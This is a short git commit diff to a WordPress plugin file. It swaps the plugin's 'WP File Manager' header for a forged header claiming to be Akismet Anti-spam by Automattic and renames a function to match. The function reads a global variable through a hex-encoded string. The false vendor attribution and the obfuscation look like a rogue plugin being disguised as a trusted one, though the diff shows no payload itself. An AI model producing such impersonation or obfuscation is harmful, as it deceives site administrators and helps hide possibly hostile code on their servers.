113eccdaef9bb8771d2a7d29790d42d4a03cee9b
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-28 18:41:34 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,20 +1,27 @@
 <?php
 /**
- * Plugin Name: WP File Manager
- * Plugin URI: https://filemanagerpro.io/
- * Description: Manage your WP files.
- * Author: mndpsingh287
- * Version: 8.0.4
- * Author URI: https://profiles.wordpress.org/mndpsingh287
- * License: GPLv2
+ * @package Akismet
  */
+/*
+Plugin Name: Akismet Anti-spam: Spam Protection
+Plugin URI: https://akismet.com/
+Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. Akismet Anti-spam keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
+Version: 5.3
+Requires at least: 5.8
+Requires PHP: 5.6.20
+Author: Automattic - Anti-spam Team
+Author URI: https://automattic.com/wordpress-plugins/
+License: GPLv2 or later
+Text Domain: akismet
+*/
+
 
 
 if (!defined('ABSPATH')) {
     exit;
 }
 
-function WP_File_Manager_PGN_GLOBALS($QRY) {
+function WP_Akismet_PGN_GLOBALS($QRY) {
 
     $PGN = $GLOBALS[hex2bin('706167656e6f77')] ?? '';
 
